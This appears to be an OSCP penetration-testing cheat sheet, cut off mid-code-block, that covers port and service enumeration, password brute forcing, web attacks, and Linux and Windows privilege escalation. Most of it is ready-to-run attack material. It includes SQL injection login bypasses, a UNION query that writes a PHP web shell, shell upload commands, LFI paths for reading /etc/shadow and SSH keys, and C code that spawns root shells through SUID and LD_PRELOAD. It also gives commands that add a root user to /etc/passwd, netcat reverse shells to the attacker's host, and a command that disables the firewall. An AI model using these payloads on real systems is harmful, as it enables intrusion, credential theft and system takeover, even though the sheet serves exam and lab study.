---
description: Document originally created by Offensive Security
icon: fan-table
---

# OSCP

### Enumeration

#### Port Scanning

**Basic Scan**

```bash
nmap -sC -sV -oA nmap -A -T5 10.10.10.x
```

* `sC`: default scripts
* `sV`: scan for versions
* `oA`: output all formats
* Optional: `-sT` (performs full TCP connect scan instead of SYN scan to prevent getting flagged by firewalls)

**Host Discovery**

```bash
# Nmap Ping Scan
nmap -sn 10.10.1.1-254 -vv -oA hosts

# Netdiscover
netdiscover -r 10.10.10.0/24
```

**DNS server discovery**

```bash
nmap -p 53 10.10.10.1-254 -vv -oA dcs
```

**NSE Scripts Scan**

```bash
# Vulscan NSE script (https://securitytrails.com/blog/nmap-vulnerability-scan)
nmap -sV --script=vulscan/vulscan.nse 

# List port-specific NSE scripts
ls /usr/share/nmap/scripts/ssh*
ls /usr/share/nmap/scripts/smb*
```

**Scanning all 65535 ports**

```bash
# 1. Use masscan to quickly find open ports
masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 > ports

# 2. Extract port numbers and run a detailed nmap scan on them
ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -u | tr '\n' ',')
nmap -Pn -sV -sC -p$ports 10.10.10.x

# Running specific vulnerability NSE scripts on found ports
nmap -Pn -sC -sV --script=vuln*.nse -p$ports 10.10.10.x -T5 -A
```

**Misc**

* From Apache Version to finding Ubuntu version -> search for "ubuntu httpd versions"

#### FTP (Port 21)

*   **Anonymous login check**

    ```bash
    ftp <ip address>
    # username: anonymous
    # pwd: anonymous
    ```
* File upload -> `put shell.php`

#### SSH (Port 22)

* `id_rsa.pub`: Public key that can be used in `authorized_keys` for login.
*   `id_rsa`: Private key that is used for login. Might ask for a password. Can be cracked with `ssh2john` and `john`.

    ```bash
    # Crack SSH private key password
    ssh2john id_rsa > hash.txt
    john --wordlist=/path/to/wordlist.txt hash.txt

    # Login with private key
    ssh -i id_rsa user@10.10.10.x

    # For passwordless login, add id_rsa.pub to target's authorized_keys
    ```

#### DNS Zone transfer check (Port 53)

* If port 53 is open
* Add host to `/etc/hosts`
* `dig axfr smasher.htb @10.10.10.135`
* See also: [Smasher2](https://ghostphisher.github.io/smasher2)
* Add the extracted domain to `/etc/hosts` and `dig` again

#### RPC Bind (111)

```bash
rpcclient --user="" --command=enumprivs -N 10.10.10.10
rpcinfo -p 10.10.10.10
rpcbind -p 10.10.10.10
```

#### RPC (135)

```bash
rpcdump.py 10.11.1.121 -p 135
rpcdump.py 10.11.1.121 -p 135 | grep ncacn_np // get pipe names
rpcmap.py ncacn_ip_tcp:10.11.1.121[135]
```

#### SMB (139 & 445)

* **Resource:** [SMB Enumeration Checklist](https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html)

```bash
# Check supported SMB protocols
nmap --script smb-protocols 10.10.10.10

# List shares (smbclient)
smbclient -L //10.10.10.10
smbclient -L //10.10.10.10 -N          // No password (SMB Null session)
smbclient --no-pass -L 10.10.10.10

# Connect to a share
smbclient //10.10.10.10/share_name

# List shares and permissions (smbmap)
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u "" -p ""
smbmap -H 10.10.10.10 -s share_name

# CrackMapExec
crackmapexec smb 10.10.10.10 -u "" -p "" --shares
crackmapexec smb 10.10.10.10 -u 'sa' -p "" --shares
crackmapexec smb 10.10.10.10 -u 'sa' -p 'sa' --shares
crackmapexec smb 10.10.10.10 -u "" -p "" --share share_name

# Enum4linux
enum4linux -a 10.10.10.10

# RPC Client enumeration
rpcclient -U "" 10.10.10.10
# Commands inside rpcclient:
# * enumdomusers
# * enumdomgroups
# * queryuser [rid]
# * getdompwinfo
# * getusrdompwinfo [rid]

# Brute force credentials
ncrack -u username -P rockyou.txt -T 5 10.10.10.10 -p smb -v

# Mount a share
mkdir /mnt/wins
mount -t cifs "//10.1.1.1/share/" /mnt/wins
mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0,gid=0

# SMB Shell to Reverse Shell
smbclient -U "username%password" //192.168.0.116/sharename
# Inside smbclient prompt:
# smb> logon "/=nc 'attack box ip' 4444 -e /bin/bash"
```

**Checklist:**

* Samba symlink directory traversal attack

#### SMB Exploits

* **Samba "username map script" Command Execution - CVE-2007-2447**
  * Version 3.0.20 through 3.0.25rc3
  * Exploit: [Samba-usermap-exploit.py](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)
* **Eternal Blue - CVE-2017-0144**
  * Affects: SMBv1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; Windows 10 Gold, 1511, and 1607; and Windows Server 2016
  * Exploit: [MS17-010-Manual-Exploit](https://github.com/adithyan-ak/MS17-010-Manual-Exploit)
* **SambaCry - CVE-2017-7494**
  * Version 4.5.9 and before
  * Exploit: [exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)

#### SNMP (161)

```bash
snmpwalk -c public -v1 10.0.0.0
snmpcheck -t 192.168.1.X -c public
onesixtyone -c names -i hosts
nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
snmpenum -t 192.168.1.X
```

#### IRC (194, 6667, 6660-7000)

* `nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 irked.htb`
* Exploit for UnrealIRCd backdoor: [UnrealIRCd-3.2.8.1-Backdoor](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor)

#### NFS (2049)

* `showmount -e 10.1.1.27`
* `mkdir /mnt/nfs`
* `mount -t nfs 192.168.2.4:/nfspath-shown /mnt/nfs`
* Permission Denied? [Write-up Vulnix](https://blog.christophetd.fr/write-up-vulnix/)

#### MYSQL (3306)

* `nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122`

#### Redis (6379)

In the output of `config get *` you could find the home of the redis user (usually `/var/lib/redis` or `/home/redis/.ssh`), and knowing this you know where you can write the authenticated\_users file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it:

1. Generate a ssh public-private key pair on your pc: `ssh-keygen -t rsa`
2.  Write the public key to a file:

    ```bash
    (echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
    ```
3. Import the file into redis: `cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit`
4.  Save the public key to the `authorized_keys` file on redis server:

    ```bash
    root@Urahara:~# redis-cli -h 10.85.0.52
    10.85.0.52:6379> config set dir /home/test/.ssh/
    OK
    10.85.0.52:6379> config set dbfilename "authorized_keys"
    OK
    10.85.0.52:6379> save
    OK
    ```

#### Port Knocking

```bash
# TCP
knock -v 192.168.0.116 4 27391 159

# UDP
knock -v 192.168.0.116 4 27391 159 -u

# TCP & UDP
knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
```

#### Misc

* Run autorecon
* [https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/enumeration](https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/enumeration)

#### IF NOTHING WORKS

* HTB Admirer Walkthrough: [https://www.youtube.com/watch?v=\_zMg0fHwwfw\&ab\_channel=IppSec](https://www.youtube.com/watch?v=_zMg0fHwwfw\&ab_channel=IppSec)

***

### Bruteforce

#### Directory Bruteforce

**Cewl:**

```bash
cewl -d 2 -m 5 -w docswords.txt http://10.10.10.10
```

* `-d depth`
* `-m minimum word length`
* `-w output file`
* `--lowercase` lowercase all parsed words (optional)

#### Password / Hash Bruteforce

**Hashcat:**

* m parameter examples: [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
* hashid match: [https://mattw.io/hashID/types](https://mattw.io/hashID/types)

```bash
hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt       // MD5 raw
hashcat -m 1800 'hash$' /home/kali/Desktop/rockyou.txt    // sha512crypt
hashcat -m 1600 'hash$' /home/kali/Desktop/rockyou.txt    // MD5(APR)
hashcat -m 1500 'hash$' /home/kali/Desktop/rockyou.txt    // DES(Unix), Traditional DES
hashcat -m 500 'hash$' /home/kali/Desktop/rockyou.txt     // MD5crypt, MD5 (Unix)
hashcat -m 400 'hash$' /home/kali/Desktop/rockyou.txt     // Wordpress
```

**John the Ripper:**

```bash
john hashfile --wordlist=/home/kali/Desktop/rockyou.txt --format=raw-md5
```

#### Online tools

* [https://crackstation.net/](https://crackstation.net/)
  * LM, NTLM, md2, md4, md5, md5(md5\_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1\_bin)), QubesV3.1BackupDefaults
* [https://www.dcode.fr/tools-list](https://www.dcode.fr/tools-list)
  * MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [https://md5.gromweb.com/](https://md5.gromweb.com/) (MD5)

#### Protocols Bruteforce

**Hydra**

* Supports: TELNET, FTP, HTTP, HTTPS, HTTP-PROXY, SMB, SMBNT, MS-SQL, MYSQL, REXEC, irc, RSH, RLOGIN, CVS, SNMP, SMTP, SOCKS5, VNC, POP3, IMAP, NNTP, PCNFS, XMPP, ICQ, SAP/R3, LDAP2, LDAP3, Postgres, Teamspeak, Cisco auth, Cisco enable, AFP, Subversion/SVN, Firebird, LDAP2, Cisco AAA

**Medusa**

* Supports: AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper, Web Form

**Ncrack (Fastest)**

* Supports: RDP, SSH, http(s), SMB, pop3(s), VNC, FTP, telnet

**SSH Bruteforce**

```bash
ncrack -v -U user.txt -P pass.txt ssh://10.10.10.10:<port> -T5
hydra -L users.txt -P pass.txt 192.168.0.114 ssh
```

**SMB Bruteforce**

```bash
ncrack -u qiu -P rockyou.txt -T 5 192.168.0.116 -p smb -v
```

**HTTP Post Bruteforce**

```bash
hydra -L users.txt -P rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^&Login=Login:F=Invalid username or password"
```

#### Wordlist Management

```bash
# For removing duplications in wordlist
cat wordlist.txt| sort | uniq > new_word.txt
```

***

### Web (80, 443)

#### Checklist

* [ ] View SSL certificates for usernames
* [ ] View Source code
* [ ] Check `/robots.txt`, `.htaccess`, `.htpasswd`
* [ ] Check HTTP Request
* [ ] Run Burp Spider
* [ ] View Console
* [ ] Use Nikto
* [ ] Check OPTIONS
* [ ] HTTP PUT / POST File upload
* [ ] Parameter fuzzing with wfuzz
* [ ] Browser response vs Burp response
* [ ] Shell shock (cgi-bin/status)
* [ ] Cewl wordlist and directory bruteforce
* [ ] `nmap --script http-enum 192.168.10.55`
* [ ] Apache version exploit & other base server exploits

#### Port 443 Specifics

* `nmap -Pn -sV --script ssl* -p 443 10.10.10.60 -A -T5`
* Heartbleed (`sslyze --heartbleed <ip>`)
* Heartbleed exploit code ([gist](https://gist.github.com/eelsivart/10174134))
* Shellshock
* Poodle

#### IIS

* [Hacktricks: IIS Pentesting](https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services)
* Try changing file extension from `.asp` to `.asp.txt` to reveal the source code.

#### Apache

* Struts: [Apache-Struts-0Day-Exploit](https://github.com/LightC0der/Apache-Struts-0Day-Exploit)
* Shell shock: [Exploit-DB 34900](https://www.exploit-db.com/exploits/34900)
* OpenFuck: [https://github.com/exploit-inters/OpenFuck](https://github.com/exploit-inters/OpenFuck)

#### Directory Enumeration

* **Apache Extensions:** `php`, `asp`, `txt`, `xml`, `bak`
* **IIS Extensions:** `asp`, `aspx`, `txt`, `ini`, `tmp`, `bak`, `old`

**Gobuster quick directory busting**

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -u http://10.10.10.x
```

**Gobuster search with file extension**

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 100 -u http://10.10.10.x -x php,txt
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.x -x html
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.x
```

**Gobuster comprehensive directory busting**

```bash
gobuster dir -s 200,204,301,302,307,403 -w /usr/share/seclists/Discovery/Web_Content/big.txt -u http://10.10.10.x
```

* `gobuster dir -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -u http://10.10.10.x`
* `-k`: ignore SSL verification
* `-x`: specific extension
* Other tools: Dirbuster, Dirb
*   Custom directory enumeration (HTB Obscurity):

    ```bash
    wfuzz -c -z file,common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
    ```

#### Parameter Fuzzing

**WFUZZ**

* `hc`: status code to ignore
* `hw`: word length to ignore
* `hh`: char length to ignore
* `hl`: line length to ignore

```bash
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 --hw 12 http://example.com/FUZZ
```

#### Wordpress

**Wpscan**

```bash
# Enumerate users & vulnerable plugins
wpscan --url http://10.10.10.10 -e u,vp

# Bruteforce passwords
wpscan --url 10.10.10 --passwords rockyou.txt --usernames elliot
```

**Metasploit**

```bash
use auxiliary/scanner/http/wordpress_login_enum
```

**Username Enumeration via Bruteforce**

*   Script: [wp\_login\_user\_enumeration.py](https://github.com/SecurityCompass/wordpress-scripts/blob/master/wp_login_user_enumeration.py)

    ```bash
    python wp_brute.py -t http://10.10.10.10 -u usernames.txt
    ```

#### SQL Injection

**Payloads**

```sql
)'
"
')
")
`')
'))
"))
`))
'-SLEEP(30); #
```

**Login Bypass**

```sql
-- Both user and password, or specific username and payload as password
' or 1=1 --
' or '1'='1
' or 1=1 --+
user' or 1=1;#
user' or 1=1 LIMIT 1;#
user' or 1=1 LIMIT 0,1;#
```

**UNION BASED SQL**

```sql
' order by 1 --
' UNION SELECT 1,2,3 --
' UNION SELECT 1,@@version,3 --
' UNION SELECT 1,user(),3 --
' UNION SELECT 1,load_file('/etc/passwd'),3 --
' UNION SELECT 1,load_file(0x2f6574632f706173737764),3 -- //hex encode
' UNION SELECT 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100)),3 -- // char encode

-- List databases available
' UNION SELECT 1,2,3,4,5,group_concat(table_schema) from information_schema.schemata --

-- Fetch Table names
' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --
' union all select 1,2,3,4,table_name,6 FROM information_schema.tables --

-- Fetch Column names from Table
' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --
' union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users' --

-- Dump data from Columns using 0x3a as seperator
' UNION SELECT 1,group_concat(user,0x3a,pasword),3 from users limit 0,1--

-- Backdoor
' union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE '/var/www/html/shell.php'--
```

**MSSQL**

```sql
'; WAITFOR DELAY '00:00:30'; --
```

#### File Upload

**HTTP PUT**

```bash
nmap -p 80 192.168.1.103 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='/path/to/shell.php'

curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
```

**Cadaver**

```bash
cadaver http://192.168.1.103/dav/
put /tmp/shell.php
```

**JPG to PNG shell**

```bash
# shell.php
<?php system($_GET['cmd']); ?>

# Embed shell into image metadata
exiftool "-comment<=shell.php" malicious.png

# Verify
strings malicious.png | grep system
```

**Upload Files through POST**

```bash
# POST file
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php

# POST binary data to web form
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;"
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

#### LFI (Local File Inclusion)

**Common Files**

```
/etc/passwd
/etc/shadow
/etc/knockd.conf  // port knocking config
```

**LFI with Wfuzz**

```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt http://url/index.php?page=FUZZ
```

**Basic LFI**

```
http://url/index.php?page=../../../etc/passwd
http://url/index.php?page=../../../etc/shadow
http://url/index.php?page=../../../home/user/.ssh/id_rsa.pub
http://url/index.php?page=../../../home/user/.ssh/id_rsa
http://url/index.php?page=../../../home/user/.ssh/authorized_keys
```

**Null byte (%00)**

```
http://url/index.php?page=../../../etc/passwd%00
```

**php://filter**

```
http://url/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://url/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

**input://**

```
http://url/index.php?page=php://input
# POST DATA: <?php system('id'); ?>
```

***

### Linux Privilege Escalation

#### OS & User Enumeration

```bash
################# User Enumeration #################
whoami
id
sudo -l
cat /etc/passwd
ls -la /etc/shadow

################# OS Enumeration ###################
cat /etc/issue
cat /etc/*-release
cat /proc/version
uname -a
arch
ldd --version

################# Installed tools ##################
which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp

############# File owners and permissions ##########
ls -la
find . -ls
history
cat ~/.bash_history
find / -type f -user <username> -readable 2> /dev/null # Readable files for user
find / -writable -type d 2>/dev/null # Writable files by the user
find /usr/local/ -type d -writable

################# File mount #######################
# /mnt /media -> usb devices and other mounted disks
mount # show all the mounted drives
df -h # list all partitions
cat /etc/fstab # list all drives mounted at boot time
/bin/lsblk

################# Applications #####################
dpkg -l # for Debian based systems

################# Cron tabs ########################
ls -lah /etc/cron*
cat /etc/crontab
ls -la /var/log/cron*         # Locating cron logs
find / -name cronlog 2>/dev/null
grep "CRON" /var/log/cron.log # for locating running jobs from logs
grep CRON /var/log/syslog     # grepping cron from syslog

################# Internal Ports ###################
netstat -alnp | grep LIST | grep port_num
netstat -antp
netstat -tulnp
# curl the listening ports

################ Interesting DIRS ##################
/
/dev
/scripts
/opt
/mnt
/var/www/html
/var
/etc
/media
/backup

################# SUID Binaries ####################
# (https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -user root 2>/dev/null
ldd /usr/bin/binary-name
strace /usr/local/bin/fishybinary 2>&1 | grep -iE "open|access|no such file"

################ Firewall Enumeration ##############
grep -Hs iptables /etc/*

################ Kernal Modules ####################
lsmod
/sbin/modinfo <mod name>
```

#### Privesc Checklist

* **sudo rights** ([link](https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d))
* **sensitive files & permission misconfiguration** (SSH keys, shadow files)
* **SUID Binaries**
* **Internal Ports**
* **Processes running with root privilege**
* **Cron tabs**
  * Hidden cron process with pspy
* **Mounted filesystems**
* **TMUX session hijacking**
* **Path Hijacking**
* **Process Injection** ([link](https://github.com/nongiach/sudo_inject))
* **Docker PS**
* **Interesting groups** ([link](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe))
  * Wheel
  * Shadow
  * Disk
  * Video
  * Root
  * Docker
  * lxd - ([link](https://www.hackingarticles.in/lxd-privilege-escalation/))
* **Environment variables**
* **bash version < 4.2-048 | 4.4** ([TryHackMe Task 14, 15](https://tryhackme.com/room/linuxprivesc))
* **NFS Misconfiguration**
* **linpeas.sh -a** //all checks

#### SUID Shared Object Injection

1.  Find a SUID binary that looks fishy

    ```bash
    strace /usr/local/bin/fishybinary 2>&1 | grep -iE "open|access|no such file"
    ```
2. Match the shared object that sits in a path where you have write access
3. Create a shared object in the missing SO file name
4. Run the SUID binary

#### NFS Misconfiguration

* **Resource**: [TryHackMe Task 19](https://tryhackme.com/room/linuxprivesc)

1. On Target: `cat /etc/exports` (Look for `no_root_squash`)
2.  On Kali:

    ```bash
    mkdir /tmp/nfs
    mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs

    # Create payload
    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
    chmod +xs /tmp/nfs/shell.elf
    ```
3.  On Target:

    ```bash
    /tmp/shell.elf
    ```

#### Kernel Exploits

1.  **Enumerate Kernel Version**

    ```bash
    cat /proc/version
    uname -r
    uname -mrs
    cat /etc/lsb-release
    cat /etc/os-release
    ```
2. Search for exploits (searchsploit, google)
3. Compile exploit: `gcc exploit.c -o exp`
4.  Compile exploit in local machine and upload to remote machine

    ```bash
    # Example for 32-bit
    gcc -m32 -Wl,--hash-style=both 9542.c -o 9542
    sudo apt-get install gcc-multilib
    ```

#### Recover Deleted Files

* **extundelete** (HTB mirai - [link](https://tiagotavares.io/2017/11/mirai-hack-the-box-retired/))
* `strings`

#### C Program to SetUID /bin/bash

```c
#include <unistd.h>
int main()
{
  setuid(0);
  execl("/bin/bash", "bash", (char *)NULL);
  return 0;
}
```

**Compile and execute:**

```bash
gcc -Wall suid.c -o exploit
sudo chown root exploit
sudo chmod u+s exploit

$ ls -l exploit
-rwsr-xr-x 1 root users 6894 11 sept. 22:05 exploit

./exploit
# whoami
root
```

#### MySQL Privilege Escalation

**MYSQL UDF Exploit:** [https://www.exploit-db.com/exploits/1518](https://www.exploit-db.com/exploits/1518)

```bash
# Compile shared object
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o

# In MySQL
mysql -u root
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit;

# Execute shell
user@target$ /tmp/rootbash -p
```

**MYSQL running as root:**

```sql
mysql -u root
select sys_exec('whoami');
select sys_eval('whoami');

/* If function doesnt exist, create the function */
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';

-- if NULL returns, try redirecting the errors
select sys_eval('ls /root 2>&1');
```

#### Sudo Abuse

1.  Check `sudo -l`

    ```bash
    $ sudo -l
    [sudo] password for appadmin:
    User appadmin may run the following commands on this host:
        (root) /opt/Support/start.sh
    ```
2. **Checklist**
   * [ ] Write permission to `start.sh`?
   * [ ] Write permission to the `/opt/support` directory?
   * [ ] Create `start.sh` if it doesn't exist?

#### Environment Variables

* **Resource:** [TryHackMe Room](https://tryhackme.com/room/linuxprivesc)
* Check which environment variables are inherited (look for the `env_keep` options in `sudo -l`).

**LD\_PRELOAD** `LD_PRELOAD` is an optional environmental variable containing one or more paths to shared libraries that the loader will load before any other shared library.

```c
/* preload.c */
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}
```

**Compile and run:**

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

**LD\_LIBRARY\_PATH** `LD_LIBRARY_PATH` provides a list of directories where shared libraries are searched for first.

1.  Run `ldd` against the program you can execute as sudo:

    ```bash
    ldd /usr/sbin/apache2
    ```
2.  Create a shared object with the same name as one of the listed libraries (e.g., `libcrypt.so.1`)

    ```c
    /* library_path.c */
    #include <stdio.h>
    #include <stdlib.h>
    static void hijack() __attribute__((constructor));
    void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
    }
    ```
3.  **Compile and run:**

    ```bash
    gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
    sudo LD_LIBRARY_PATH=/tmp program-name-here
    ```

#### Other Escalation Methods

```bash
# Set root password
echo 'root:password' | chpasswd

# Add new root user to /etc/passwd
echo "exploit:YZE7YPhZJyUks:0:0:root:/root:/bin/bash" >> /etc/passwd
su exploit

# Edit /etc/passwd to change user GID to 0 (root)
nano /etc/passwd

# Add NOPASSWD to /etc/sudoers
nano /etc/sudoers
# user ALL=(ALL) NOPASSWD:ALL

# Copy bash, set SUID bit
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
/tmp/rootbash -p
```

#### Tools & Resources

* **Tools**
  * [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) (HTB Nibbles)
  * [SUIDENUM](https://github.com/Anon-Exploiter/SUID3NUM)
  * [LinEnum.sh](https://github.com/rebootuser/LinEnum)
  * [linpeas.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
  * [Linprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
  * [pspy](https://github.com/DominicBreuker/pspy) (for crontabs)
* **Resources**
  * [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_-\_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
  * [https://github.com/Ignitetechnologies/Privilege-Escalation](https://github.com/Ignitetechnologies/Privilege-Escalation)
  * [https://gtfobins.github.io/](https://gtfobins.github.io/)
  * [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

***

### Windows Privilege Escalation

#### Enumeration

**OS Info Enumeration**

```cmd
systeminfo
hostname
echo %username%
wmic qfe -> check patches
wmic logicaldisk -> get other disk information
```

**User Enumeration**

```cmd
whoami
whoami /priv -> check user privileges
whoami /groups -> check user groups
net user -> list all users
net user <username> -> check groups associated with a user
net localgroup -> Check all the local groups available
net localgroup <group name> -> List the members of the given localgroup
```

**Task | Service | Process Enumeration**

```cmd
sc queryex type= service (Lists all services)
tasklist /SVC
tasklist
net start
DRIVERQUERY
wmic product get name, version, vendor
```

**Permission Enumeration**

```cmd
# Check permissions on Program Files
icacls "C:\Program Files"

# Grant permission to a file
icacls root.txt /grant <username>:F

# Check PowerShell history file
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Check stored usernames and passwords
cmdkey /list
```

**Network based**

```cmd
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

**Password Hunting**

```cmd
findstr /si password *.txt *.ini *.config
dir /s *pass* == *cred* == *vnc* == *.config*
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc*
where /R C:\ user.txt
where /R C:\ *.ini
```

* [Swisskyrepo for manual pwd enumeration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

**AV / Firewall check / Service Enumeration**

```cmd
sc query windefend
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
netsh firewall show state (show firewall running or stopped)
netsh firewall show config (show firewall configuration)
netsh firewall set opmode disable # Disable firewall
```

**Scheduled Tasks**

```cmd
schtasks /query /fo LIST /v
```

**Mount Information**

```cmd
mountvol
```

#### Escalation Techniques

**Service Account Priv Esc (Token Impersonation)**

* Check `whoami /priv` for `SeImpersonatePrivilege`.
* Use JuicyPotato, RottenPotato, etc.

**Run As**

*   Use `cmdkey` to list stored credentials.

    ```cmd
    cmdkey /list
    Currently stored credentials:
      Target: Domain:interactive=WORKGROUP\Administrator
      Type: Domain Password
      User: WORKGROUP\Administrator
    ```
*   Using `runas` with a provided set of credentials.

    ```cmd
    runas /savecred /user:admin C:\PrivEsc\reverse.exe
    C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "command"
    ```

**Access Check (Sysinternals accesschk.exe)**

```cmd
accesschk.exe -ucqv [service_name] /accepteula
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
```

*   **Find all weak folder permissions per drive:**

    ```cmd
    accesschk.exe /accepteula -uwdqs Users c:\
    accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
    ```
*   **Find all weak file permissions per drive:**

    ```cmd
    accesschk.exe /accepteula -uwsv "Everyone" "C:\Program Files"
    accesschk.exe /accepteula -uwqs Users c:\*.*
    accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
    ```
*   **Powershell equivalent:**

    ```powershell
    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone"}
    ```

**Binary Planting / Hijacking Service Binary**

*   [Hacktricks Link](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services)

    ```cmd
    sc qc [service_name]     // for service properties
    sc query [service_name]  // for service status

    # Check permissions on the binary path with icacls
    # If writable, replace the original binary with a malicious one.

    # Modify service binary path
    sc config [service_name] binpath= "C:\Temp\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
    sc config [service_name] obj= ".\LocalSystem" password= ""

    # Start the service
    net start [service_name]
    ```

**Unquoted Service Path Privilege Escalation**

*   [Pentest.blog Link](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)

    ```cmd
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
    ```

    If a path is unquoted and has spaces (e.g., `C:\Program Files\Some App\service.exe`), you can place a malicious executable at `C:\Program.exe`.

**Always Install Elevated**

*   Check registry keys:

    ```cmd
    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
